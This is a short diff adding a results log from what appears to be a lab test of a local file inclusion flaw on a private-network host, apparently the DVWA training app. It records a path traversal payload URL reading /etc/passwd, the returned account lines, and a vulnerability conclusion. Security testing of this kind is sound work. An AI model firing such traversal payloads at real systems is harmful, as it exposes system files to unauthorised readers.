@@ -1,0 +1,17 @@
+LFI / PATH TRAVERSAL SIMULATION RESULTS
+Date: May 2, 2026
+Target: 192.168.1.17
+
+=== PAYLOAD ===
+URL: http://192.168.1.17/vulnerabilities/fi/?page=../../etc/passwd
+
+=== RESPONSE ===
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+... (isi lengkap)
+
+=== KESIMPULAN ===
+Vulnerable to LFI (CWE-98)
+Attacker can read arbitrary system files
